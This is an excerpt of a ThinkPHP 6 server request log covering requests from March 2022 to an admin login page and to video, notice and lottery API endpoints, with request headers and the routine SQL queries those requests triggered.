  'accept' => '*/*',
  'user-agent' => 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10.11; rv:47.0) Gecko/20100101 Firefox/47.0',
  'host' => '40.83.103.135:443',
  'content-type' => '',
  'content-length' => '',
)
[ info ] [ PARAM ] array (
)
---------------------------------------------------------------

[2022-03-05T20:50:10+08:00] 154.209.125.40 GET 40.83.103.135:443/admin/login/index/
[运行时间：0.025777s] [吞吐率：38.79req/s] [内存消耗：2,810.37kb] [文件加载：90]
[ info ] [ LANG ] /www/wwwroot/tongchengmiyue/tp6/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
)
[ info ] [ HEADER ] array (
  'connection' => 'keep-alive',
  'accept' => '*/*',
  'user-agent' => 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10.11; rv:47.0) Gecko/20100101 Firefox/47.0',
  'host' => '40.83.103.135:443',
  'content-type' => '',
  'content-length' => '',
)
[ info ] [ PARAM ] array (
)
[ info ] [ VIEW ] /www/wwwroot/tongchengmiyue/tp6/application/admin/view/login/index.html [ array (
) ]
---------------------------------------------------------------

[2022-03-05T21:21:10+08:00] 139.207.83.124 GET admin.mihuanjishupinzhifuwudiyi44.cc/api/system/base
[运行时间：0.062683s] [吞吐率：15.95req/s] [内存消耗：3,260.80kb] [文件加载：79]
[ info ] [ LANG ] /www/wwwroot/tongchengmiyue/tp6/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
)
[ info ] [ HEADER ] array (
  'accept-language' => 'zh,zh-CN;q=0.9,en-US;q=0.8,en;q=0.7',
  'accept-encoding' => 'gzip, deflate',
  'referer' => 'https://www.mihuanjishupinzhifuwudiyi50.cc/',
  'sec-fetch-dest' => 'empty',
  'sec-fetch-mode' => 'cors',
  'sec-fetch-site' => 'cross-site',
  'x-requested-with' => 'com.mdcm.hengyao',
  'origin' => 'https://www.mihuanjishupinzhifuwudiyi50.cc',
  'user-agent' => 'meimaweb-android',
  'accept' => 'application/json, text/plain, */*',
  'host' => 'admin.mihuanjishupinzhifuwudiyi44.cc',
  'content-type' => '',
  'content-length' => '',
)
[ info ] [ PARAM ] array (
)
[ info ] [ DB ] INIT mysql
[ sql ] [ DB ] CONNECT:[ UseTime:0.000367s ] mysql:host=127.0.0.1;dbname=tcmy;charset=utf8
[ sql ] [ SQL ] SHOW COLUMNS FROM `system` [ RunTime:0.006948s ]
[ sql ] [ SQL ] SELECT * FROM `system` WHERE  `key` = 'base' LIMIT 1 [ RunTime:0.000317s ]
---------------------------------------------------------------

[2022-03-05T21:21:10+08:00] 139.207.83.124 GET admin.mihuanjishupinzhifuwudiyi44.cc/api/system/config
[运行时间：0.199757s] [吞吐率：5.01req/s] [内存消耗：3,411.34kb] [文件加载：82]
[ info ] [ LANG ] /www/wwwroot/tongchengmiyue/tp6/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
)
[ info ] [ HEADER ] array (
  'accept-language' => 'zh,zh-CN;q=0.9,en-US;q=0.8,en;q=0.7',
  'accept-encoding' => 'gzip, deflate',
  'referer' => 'https://www.mihuanjishupinzhifuwudiyi50.cc/',
  'sec-fetch-dest' => 'empty',
  'sec-fetch-mode' => 'cors',
  'sec-fetch-site' => 'cross-site',
  'x-requested-with' => 'com.mdcm.hengyao',
  'origin' => 'https://www.mihuanjishupinzhifuwudiyi50.cc',
  'user-agent' => 'meimaweb-android',
  'accept' => 'application/json, text/plain, */*',
  'host' => 'admin.mihuanjishupinzhifuwudiyi44.cc',
  'content-type' => '',
  'content-length' => '',
)
[ info ] [ PARAM ] array (
)
[ info ] [ DB ] INIT mysql
[ sql ] [ DB ] CONNECT:[ UseTime:0.001957s ] mysql:host=127.0.0.1;dbname=tcmy;charset=utf8
[ sql ] [ SQL ] SHOW COLUMNS FROM `notice` [ RunTime:0.009987s ]
[ sql ] [ SQL ] SELECT `text` FROM `notice` WHERE  `hot` = 1  AND `status` = 1 LIMIT 1 [ RunTime:0.000318s ]
[ sql ] [ SQL ] SHOW COLUMNS FROM `banner` [ RunTime:0.009298s ]
[ sql ] [ SQL ] SELECT * FROM `banner` WHERE  `status` = 1 [ RunTime:0.000244s ]
[ sql ] [ SQL ] SHOW COLUMNS FROM `video` [ RunTime:0.009460s ]
[ sql ] [ SQL ] SELECT * FROM `video` WHERE  `vod_status` = 1  AND `vod_hot` = 1 ORDER BY `id` ASC [ RunTime:0.060105s ]
[ sql ] [ SQL ] SELECT * FROM `video` WHERE  `vod_status` = 1 ORDER BY rand(),`id` ASC LIMIT 8 [ RunTime:0.025149s ]
---------------------------------------------------------------

[2022-03-05T21:21:11+08:00] 139.207.83.124 GET admin.mihuanjishupinzhifuwudiyi44.cc/api/Lottery/hotLottery
[运行时间：0.030720s] [吞吐率：32.55req/s] [内存消耗：3,333.63kb] [文件加载：81]
[ info ] [ LANG ] /www/wwwroot/tongchengmiyue/tp6/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
)
[ info ] [ HEADER ] array (
  'accept-language' => 'zh,zh-CN;q=0.9,en-US;q=0.8,en;q=0.7',
  'accept-encoding' => 'gzip, deflate',
  'referer' => 'https://www.mihuanjishupinzhifuwudiyi50.cc/',
  'sec-fetch-dest' => 'empty',
  'sec-fetch-mode' => 'cors',
  'sec-fetch-site' => 'cross-site',
  'x-requested-with' => 'com.mdcm.hengyao',
  'origin' => 'https://www.mihuanjishupinzhifuwudiyi50.cc',
  'user-agent' => 'meimaweb-android',
  'accept' => 'application/json, text/plain, */*',
  'host' => 'admin.mihuanjishupinzhifuwudiyi44.cc',
  'content-type' => '',
  'content-length' => '',
)
[ info ] [ PARAM ] array (
)
[ info ] [ DB ] INIT mysql
[ sql ] [ DB ] CONNECT:[ UseTime:0.000789s ] mysql:host=127.0.0.1;dbname=tcmy;charset=utf8
[ sql ] [ SQL ] SHOW COLUMNS FROM `lottery` [ RunTime:0.006917s ]
[ sql ] [ SQL ] SELECT * FROM `lottery` WHERE  `status` = 1  AND `hot` = 1 ORDER BY `id` ASC [ RunTime:0.000556s ]
---------------------------------------------------------------

[2022-03-05T22:23:19+08:00] 35.233.62.116 GET 40.83.103.135/
[运行时间：0.017229s] [吞吐率：58.04req/s] [内存消耗：2,807.91kb] [文件加载：90]
[ info ] [ LANG ] /www/wwwroot/tongchengmiyue/tp6/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
)
[ info ] [ HEADER ] array (
  'x-datadog-sampling-priority' => '1',
  'x-datadog-parent-id' => '2850587690656978143',
  'x-datadog-trace-id' => '702956787762499696',
  'connection' => 'keep-alive',
  'accept' => '*/*',
  'accept-encoding' => 'gzip, deflate',
  'user-agent' => 'python-requests/2.27.1',
  'host' => '40.83.103.135',
  'content-type' => '',
  'content-length' => '',
)
[ info ] [ PARAM ] array (
)
